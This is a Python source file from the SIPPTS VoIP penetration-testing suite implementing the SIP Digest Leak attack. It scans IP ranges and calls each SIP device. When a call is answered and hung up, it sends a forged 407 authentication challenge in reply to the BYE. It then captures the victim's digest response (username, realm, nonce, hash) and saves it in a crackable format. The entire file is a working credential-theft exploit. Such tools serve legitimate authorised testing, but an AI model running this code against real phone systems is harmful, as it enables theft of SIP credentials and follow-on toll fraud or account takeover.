#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

import ipaddress
import re
import socket
import sys
import ssl
import time
import signal
from .lib.functions import (
    create_message,
    create_response_error,
    create_response_ok,
    parse_message,
    parse_digest,
    generate_random_string,
    get_machine_default_ip,
    ip2long,
    get_free_port,
    calculateHash,
    long2ip,
    ping,
)
from .lib.color import Color
from .lib.logos import Logo


class SipDigestLeak:
    def __init__(self):
        self.ip = ""
        self.host = ""
        self.proxy = ""
        self.route = ""
        self.rport = "5060"
        self.proto = "UDP"
        self.domain = ""
        self.contact_domain = ""
        self.from_user = "100"
        self.from_name = ""
        self.from_domain = ""
        self.to_user = "100"
        self.to_name = ""
        self.to_domain = ""
        self.user_agent = "pplsip"
        self.localip = ""
        self.ofile = ""
        self.lfile = ""
        self.user = ""
        self.pwd = ""
        self.auth_code = "www"
        self.sdp = 0
        self.sdes = 0
        self.verbose = 0
        self.file = ""
        self.ppi = ""
        self.pai = ""

        self.quit = False
        self.found = []
        self.ping = False

        self.c = Color()

    def start(self):
        supported_protos = ["UDP", "TCP", "TLS"]

        self.proto = self.proto.upper()

        if self.sdes == 1:
            self.sdp = 2

        if self.sdp == None:
            self.sdp = 0

        if self.auth_code == "proxy":
            self.auth_code = "Proxy-Authenticate"
        else:
            self.auth_code = "WWW-Authenticate"

        if self.ping == 1:
            self.ping = "True"
        else:
            self.ping = "False"

        # check protocol
        if self.proto not in supported_protos:
            print(f"{self.c.BRED}Protocol {self.proto} is not supported")
            print(self.c.WHITE)
            sys.exit()

        # if rport is by default but we want to scan TLS protocol, use port 5061
        if self.rport == 5060 and self.proto == "TLS":
            self.rport = 5061

        logo = Logo("sipdigestleak")
        logo.print()

        signal.signal(signal.SIGINT, self.signal_handler)
        print(f"{self.c.BYELLOW}\nPress Ctrl+C to stop")
        print(self.c.WHITE)

        if (
            self.domain != ""
            and self.domain != str(self.ip)
            and self.domain != self.host
        ):
            print(f"{self.c.BWHITE}[✓] Customized Domain: {self.c.GREEN}{self.domain}")
        if self.contact_domain != "":
            print(
                f"{self.c.BWHITE}[✓] Customized Contact Domain: {self.c.GREEN}{self.contact_domain}"
            )
        if self.from_name != "":
            print(
                f"{self.c.BWHITE}[✓] Customized From Name: {self.c.GREEN}{self.from_name}"
            )
        if self.from_user != "100":
            print(
                f"{self.c.BWHITE}[✓] Customized From User: {self.c.GREEN}{self.from_user}"
            )
        if self.from_domain != "":
            print(
                f"{self.c.BWHITE}[✓] Customized From Domain: {self.c.GREEN}{self.from_domain}"
            )
        if self.to_name != "":
            print(
                f"{self.c.BWHITE}[✓] Customized To Name: {self.c.GREEN}{self.to_name}"
            )
        if self.to_user != "100":
            print(
                f"{self.c.BWHITE}[✓] Customized To User: {self.c.GREEN}{self.to_user}"
            )
        if self.to_domain != "":
            print(
                f"{self.c.BWHITE}[✓] Customized To Domain: {self.c.GREEN}{self.to_domain}"
            )
        if self.user_agent != "pplsip":
            print(
                f"{self.c.BWHITE}[✓] Customized User-Agent: {self.c.GREEN}{self.user_agent}"
            )

        if self.file == "":
            ips = []
            hosts = []
            for i in self.ip.split(","):
                try:
                    i = socket.gethostbyname(i)
                except:
                    pass
                hlist = list(ipaddress.ip_network(str(i)).hosts())

                if hlist == []:
                    hosts.append(i)
                else:
                    for h in hlist:
                        hosts.append(h)

            last = len(hosts) - 1
            start_ip = hosts[0]
            end_ip = hosts[last]

            ipini = int(ip2long(str(start_ip)))
            ipend = int(ip2long(str(end_ip)))

            for i in range(ipini, ipend + 1):
                if self.quit == False:
                    if self.ping == "False":
                        ips.append(long2ip(i))
                    else:
                        print(
                            f"{self.c.YELLOW}[+] Ping {str(long2ip(i))} ...{self.c.WHITE}",
                            end="\r",
                        )

                        if ping(long2ip(i), "0.1") == True:
                            print(
                                f"{self.c.GREEN}\n   [-] ... Pong str(long2ip(i)){self.c.WHITE}"
                            )
                            ips.append(long2ip(i))

            for ip in ips:
                if self.quit == False:
                    self.call(ip, self.rport, self.proto)
        else:
            try:
                with open(self.file) as f:
                    line = f.readline()

                    while line and self.quit == False:
                        m = re.search(
                            r"([0-9]*.[0-9]*.[0-9]*.[0-9]*):([0-9]*)\/([A-Z]*)", line
                        )
                        if m:
                            self.ip = "%s" % (m.group(1))
                            self.port = "%s" % (m.group(2))
                            self.proto = "%s" % (m.group(3))

                        self.call(self.ip, self.rport, self.proto)
                        line = f.readline()

                f.close()
            except:
                print(f"Error reading file {self.file}")
                exit()

        self.found.sort()
        self.print()

    def signal_handler(self, sig, frame):
        self.stop()

    def stop(self):
        self.quit = True
        time.sleep(0.1)
        print(f"{self.c.BYELLOW}\nYou pressed Ctrl+C!")
        print(f"{self.c.BWHITE}\nStopping script ... wait a moment\n")
        print(self.c.WHITE)

    def call(self, ip, port, proto):
        print(
            f"{self.c.BWHITE}[✓] Target: {self.c.GREEN}{ip}{self.c.WHITE}:{self.c.GREEN}{port}{self.c.WHITE}/{self.c.GREEN}{proto}"
        )
        print(f"{self.c.BWHITE}[✓] Output file: {self.c.GREEN}{self.ofile}")
        if self.proxy != "":
            print(f"{self.c.BWHITE}[✓] Outbound Proxy: {self.c.GREEN}{self.proxy}")
        print(self.c.WHITE)

        cseq = "1"
        auth_type = 1
        rr = ""
        digest = ""

        # my IP address
        local_ip = self.localip
        if self.localip == "":
            try:
                local_ip = get_machine_default_ip()
                self.localip = local_ip
            except:
                print(f"{self.c.BRED}Error getting local IP")
                print(
                    f"{self.c.BWHITE}Try with {self.c.BYELLOW}-local-ip{self.cBWHITE} param"
                )
                print(self.c.WHITE)
                exit()

        # SIP headers
        if self.host != "" and self.domain == "":
            self.domain = self.host
        if self.domain == "":
            self.domain = self.ip
        if not self.from_domain or self.from_domain == "":
            self.from_domain = self.domain
        if not self.to_domain or self.to_domain == "":
            self.to_domain = self.domain

        if self.contact_domain == "":
            self.contact_domain = local_ip

        if self.proxy != "":
            self.route = "<sip:%s;lr>" % self.proxy

        try:
            if self.proto == "UDP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print(f"{self.c.RED}Failed to create socket")
            print(self.c.WHITE)
            sys.exit(1)

        bind = "0.0.0.0"
        lport = 5060

        try:
            sock.bind((bind, lport))
        except:
            lport = get_free_port()
            sock.bind((bind, lport))

        if self.proxy == "":
            host = (str(ip), int(port))
        else:
            if self.proxy.find(":") > 0:
                (proxy_ip, proxy_port) = self.proxy.split(":")
            else:
                proxy_ip = self.proxy
                proxy_port = "5060"

            host = (str(proxy_ip), int(proxy_port))

        branch = generate_random_string(71, 71, "ascii")
        callid = generate_random_string(32, 32, "hex")
        tag = generate_random_string(8, 8, "hex")

        msg = create_message(
            "INVITE",
            self.localip,
            self.contact_domain,
            self.from_user,
            self.from_name,
            self.from_domain,
            self.to_user,
            self.to_name,
            self.to_domain,
            proto,
            self.domain,
            self.user_agent,
            lport,
            branch,
            callid,
            tag,
            cseq,
            "",
            "",
            1,
            "",
            self.sdp,
            "",
            self.route,
            self.ppi,
            self.pai,
            "",
            1,
        )

        print(f"{self.c.YELLOW}[=>] Request INVITE{self.c.WHITE}")

        if self.verbose == 1:
            print(
                f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
            )
            print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")

        try:
            sock.settimeout(30)

            # send INVITE
            if proto == "TCP":
                sock.connect(host)

            if self.proto == "TLS":
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.load_default_certs()

                sock_ssl = context.wrap_socket(sock, server_hostname=str(host[0]))
                sock_ssl.connect(host)
                sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
            else:
                sock.sendto(bytes(msg[:8192], "utf-8"), host)

            rescode = "100"

            while rescode[:1] == "1":
                # receive temporary code
                if self.proto == "TLS":
                    resp = sock_ssl.recv(4096)
                else:
                    resp = sock.recv(4096)

                headers = parse_message(resp.decode())

                if headers:
                    via = headers["via"]
                    rr = headers["rr"]

                    response = "%s %s" % (
                        headers["response_code"],
                        headers["response_text"],
                    )
                    rescode = headers["response_code"]
                    print(f"{self.c.CYAN}[<=] Response {response}")

                    totag = headers["totag"]

                if self.verbose == 1:
                    print(
                        f"{self.c.BWHITE}[+] Receiving from {self.ip}:{self.rport}/{self.proto} ..."
                    )
                    print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")

            if (
                self.user != ""
                and self.pwd != ""
                and (
                    headers["response_code"] == "401"
                    or headers["response_code"] == "407"
                )
            ):
                # send ACK
                print(f"{self.c.YELLOW}[=>] Request ACK")
                msg = create_message(
                    "ACK",
                    self.localip,
                    self.contact_domain,
                    self.from_user,
                    self.from_name,
                    self.from_domain,
                    self.to_user,
                    self.to_name,
                    self.to_domain,
                    proto,
                    self.domain,
                    self.user_agent,
                    lport,
                    branch,
                    callid,
                    tag,
                    cseq,
                    totag,
                    "",
                    1,
                    "",
                    0,
                    via,
                    rr,
                    "",
                    "",
                    "",
                    1,
                )

                if self.verbose == 1:
                    print(
                        f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
                    )
                    print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")

                if self.proto == "TLS":
                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                else:
                    sock.sendto(bytes(msg[:8192], "utf-8"), host)

                if headers["auth"] != "":
                    auth = headers["auth"]
                    auth_type = headers["auth-type"]
                    headers = parse_digest(auth)
                    realm = headers["realm"]
                    nonce = headers["nonce"]
                    uri = "sip:%s@%s" % (self.to_user, self.domain)
                    algorithm = headers["algorithm"]
                    cnonce = headers["cnonce"]
                    nc = headers["nc"]
                    qop = headers["qop"]

                    if qop != "" and cnonce == "":
                        cnonce = generate_random_string(8, 8, "ascii")
                    if qop != "" and nc == "":
                        nc = "00000001"

                    response = calculateHash(
                        self.user,
                        realm,
                        self.pwd,
                        "INVITE",
                        uri,
                        nonce,
                        algorithm,
                        cnonce,
                        nc,
                        qop,
                        0,
                        "",
                    )

                    digest = (
                        'Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s", algorithm=%s'
                        % (self.user, realm, nonce, uri, response, algorithm)
                    )
                    if qop != "":
                        digest += ", qop=%s" % qop
                    if cnonce != "":
                        digest += ', cnonce="%s"' % cnonce
                    if nc != "":
                        digest += ", nc=%s" % nc

                    branch = generate_random_string(71, 71, "ascii")
                    cseq = str(int(cseq) + 1)

                    print(f"{self.c.YELLOW}[=>] Request INVITE{self.c.WHITE}")

                    msg = create_message(
                        "INVITE",
                        self.localip,
                        self.contact_domain,
                        self.from_user,
                        self.from_name,
                        self.from_domain,
                        self.to_user,
                        self.to_name,
                        self.to_domain,
                        self.proto,
                        self.domain,
                        self.user_agent,
                        lport,
                        branch,
                        callid,
                        tag,
                        cseq,
                        "",
                        digest,
                        auth_type,
                        "",
                        self.sdp,
                        via,
                        self.route,
                        self.ppi,
                        self.pai,
                        "",
                        1,
                    )

                    if self.verbose == 1:
                        print(
                            f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
                        )
                        print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")

                    try:
                        if self.proto == "TLS":
                            sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                        else:
                            sock.sendto(bytes(msg[:8192], "utf-8"), host)

                        rescode = "100"
                        count = 0

                        # while rescode[:1] == '1':
                        while rescode != "200" and count < 10:
                            # receive temporary code
                            if self.proto == "TLS":
                                resp = sock_ssl.recv(4096)
                            else:
                                resp = sock.recv(4096)

                            if rescode[:1] != "1":
                                count += 1

                            headers = parse_message(resp.decode())

                            if headers:
                                rr = headers["rr"]

                                response = "%s %s" % (
                                    headers["response_code"],
                                    headers["response_text"],
                                )
                                rescode = headers["response_code"]

                                print(f"{self.c.CYAN}[<=] Response {response}")
                                if self.verbose == 1:
                                    print(
                                        f"{self.c.BWHITE}[+] Receiving from {self.ip}:{self.rport}/{self.proto} ..."
                                    )
                                    print(
                                        f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}"
                                    )

                                if rescode[:1] != "1":
                                    totag = headers["totag"]

                                    # send ACK
                                    print(f"{self.c.YELLOW}[=>] Request ACK")

                                    msg = create_message(
                                        "ACK",
                                        self.localip,
                                        self.contact_domain,
                                        self.from_user,
                                        self.from_name,
                                        self.from_domain,
                                        self.to_user,
                                        self.to_name,
                                        self.to_domain,
                                        proto,
                                        self.domain,
                                        self.user_agent,
                                        lport,
                                        branch,
                                        callid,
                                        tag,
                                        cseq,
                                        totag,
                                        "",
                                        1,
                                        "",
                                        0,
                                        via,
                                        rr,
                                        "",
                                        "",
                                        "",
                                        1,
                                    )

                                    if self.verbose == 1:
                                        print(
                                            f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
                                        )
                                        print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")

                                    if self.proto == "TLS":
                                        sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                                    else:
                                        sock.sendto(bytes(msg[:8192], "utf-8"), host)

                    except:
                        print(self.c.WHITE)

            # receive 200 Ok - call answered
            if headers["response_code"] == "200":
                cuser = headers["contactuser"]
                cdomain = headers["contactdomain"]
                if cdomain == "":
                    cdomain = self.domain
                else:
                    if cuser != None and cuser != "":
                        cdomain = cuser + "@" + cdomain

                totag = headers["totag"]

                # send ACK
                print(f"{self.c.YELLOW}[=>] Request ACK")

                msg = create_message(
                    "ACK",
                    self.localip,
                    self.contact_domain,
                    self.from_user,
                    self.from_name,
                    self.from_domain,
                    self.to_user,
                    self.to_name,
                    self.to_domain,
                    proto,
                    cdomain,
                    self.user_agent,
                    lport,
                    branch,
                    callid,
                    tag,
                    cseq,
                    totag,
                    digest,
                    auth_type,
                    "",
                    0,
                    via,
                    rr,
                    "",
                    "",
                    "",
                    1,
                )

                if self.verbose == 1:
                    print(
                        f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
                    )
                    print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")

                if self.proto == "TLS":
                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                else:
                    sock.sendto(bytes(msg[:8192], "utf-8"), host)

                # wait for BYE
                start = time.time()
                bye = False
                while bye == False:
                    now = time.time()

                    # Wait 30 sec max
                    if now - start > 30:
                        break

                    print(f"{self.c.WHITE}\t... waiting for BYE ...")

                    if self.proto == "TLS":
                        resp = sock_ssl.recv(4096)
                    else:
                        resp = sock.recv(4096)

                    if resp.decode()[0:3] == "BYE":
                        bye = True
                        print(f"{self.c.CYAN}[<=] Received BYE")
                        headers = parse_message(resp.decode())
                        branch = headers["branch"]
                        cseq = headers["cseq"]
                        via = headers["via2"]
                    else:
                        print(f"{self.c.CYAN}[<=] Response {response}")

                    if self.verbose == 1:
                        print(
                            f"{self.c.BWHITE}[+] Receiving from {self.ip}:{self.rport}/{self.proto} ..."
                        )
                        print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")

                # send 407 with digest
                cseq = int(cseq)
                msg = create_response_error(
                    "407 Proxy Authentication Required",
                    self.from_user,
                    self.to_user,
                    proto,
                    self.domain,
                    lport,
                    cseq,
                    "BYE",
                    branch,
                    callid,
                    tag,
                    totag,
                    local_ip,
                    via,
                    self.auth_code,
                )

                print(f"{self.c.YELLOW}[=>] Request 407 Proxy Authentication Required")

                if self.verbose == 1:
                    print(
                        f"{self.c.BWHITE}[+] Sending to{self.ip}:{self.rport}/{self.proto} ..."
                    )
                    print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")

                if self.proto == "TLS":
                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                else:
                    sock.sendto(bytes(msg[:8192], "utf-8"), host)

                # receive auth BYE
                if self.proto == "TLS":
                    resp = sock_ssl.recv(4096)
                else:
                    resp = sock.recv(4096)

                print(f"{self.c.CYAN}[<=] Received BYE")

                if self.verbose == 1:
                    print(
                        f"{self.c.BWHITE}[+] Receiving from {self.ip}:{self.rport}/{self.proto} ..."
                    )
                    print(f"{self.c.GREEN}{resp.decode()}{self.c.WHITE}")

                headers = parse_message(resp.decode())
                branch = headers["branch"]

                try:
                    auth = headers["auth"]
                except:
                    auth = ""

                # send 200 OK
                msg = create_response_ok(
                    self.from_user,
                    self.to_user,
                    proto,
                    self.domain,
                    lport,
                    cseq,
                    branch,
                    callid,
                    tag,
                    totag,
                )

                print(f"{self.c.YELLOW}[=>] Request 200 Ok")

                if self.verbose == 1:
                    print(
                        f"{self.c.BWHITE}[+] Sending to {self.ip}:{self.rport}/{self.proto} ..."
                    )
                    print(f"{self.c.YELLOW}{msg}{self.c.WHITE}")

                if self.proto == "TLS":
                    sock_ssl.sendall(bytes(msg[:8192], "utf-8"))
                else:
                    sock.sendto(bytes(msg[:8192], "utf-8"), host)

                if auth != "":
                    print(f"{self.c.BGREEN}Auth={auth}\n{self.c.WHITE}")

                    line = "%s###%d###%s###%s" % (ip, port, proto, auth)
                    self.found.append(line)

                    headers = parse_digest(auth)

                    if self.ofile != "":
                        data = '%s"%s"%s"%s"BYE"%s"%s"%s"%s"%s"MD5"%s' % (
                            ip,
                            local_ip,
                            headers["username"],
                            headers["realm"],
                            headers["uri"],
                            headers["nonce"],
                            headers["cnonce"],
                            headers["nc"],
                            headers["qop"],
                            headers["response"],
                        )

                        f = open(self.ofile, "a+")
                        f.write(data)
                        f.write("\n")
                        f.close()

                        print(f"{self.c.WHITE}Auth data saved in file {self.ofile}")
                else:
                    print(f"{self.c.BRED}No Auth Digest received :(\n{self.c.WHITE}")
                    line = "%s###%d###%s###No Auth Digest received :(" % (
                        ip,
                        port,
                        proto,
                    )
                    self.found.append(line)
            else:
                print(f"{self.c.BRED}No Auth Digest received :(\n{self.c.WHITE}")
                line = "%s###%d###%s###%s %s" % (
                    ip,
                    port,
                    proto,
                    headers["response_code"],
                    headers["response_text"],
                )
                self.found.append(line)
        except socket.timeout:
            print(f"{self.c.BRED}No Auth Digest received :(\n{self.c.WHITE}")
            line = "%s###%d###%s###No Auth Digest received :(" % (ip, port, proto)
            self.found.append(line)
            pass
        except:
            pass
        finally:
            sock.close()

        return

    def print(self):
        iplen = len("IP address")
        polen = len("Port")
        prlen = len("Proto")
        relen = len("Response")

        for x in self.found:
            (ip, port, proto, res) = x.split("###")
            if len(ip) > iplen:
                iplen = len(ip)
            if len(port) > polen:
                polen = len(port)
            if len(proto) > prlen:
                prlen = len(proto)
            if len(res) > relen:
                relen = len(res)

        tlen = iplen + polen + prlen + relen + 11

        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (relen + 2)}+"
        )

        print(
            f"{self.c.WHITE}| {self.c.BWHITE}{'IP address'.ljust(iplen)}{self.c.WHITE} | {self.c.BWHITE}{'Port'.ljust(polen)}{self.c.WHITE} | {self.c.BWHITE}{'Proto'.ljust(prlen)}{self.c.WHITE} | {self.c.BWHITE}{'Response'.ljust(relen)}{self.c.WHITE} |"
        )

        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (relen + 2)}+"
        )

        if len(self.found) == 0:
            print(f"{self.c.WHITE}| {self.c.WHITE}{'Nothing found'.ljust(tlen - 2)} |")
        else:
            if self.lfile != "":
                f = open(self.lfile, "w")

            for x in self.found:
                (ip, port, proto, res) = x.split("###")

                if res == "No Auth Digest received :(":
                    colorres = self.c.BBLUE
                else:
                    colorres = self.c.BRED

                print(
                    f"{self.c.WHITE}| {self.c.BGREEN}{ip.ljust(iplen)}{self.c.WHITE} | {self.c.BMAGENTA}{port.ljust(polen)}{self.c.WHITE} | {self.c.BYELLOW}{proto.ljust(prlen)}{self.c.WHITE} | {colorres}{res.ljust(relen)}{self.c.WHITE} |"
                )

                if self.lfile != "":
                    f.write("%s:%s/%s => %s" % (ip, port, proto, res))
                    f.write("\n")

            if self.lfile != "":
                f.close()

        print(
            f"{self.c.WHITE}+{'-' * (iplen + 2)}+{'-' * (polen + 2)}+{'-' * (prlen + 2)}+{'-' * (relen + 2)}+"
        )
        print(self.c.WHITE)

        self.found.clear()
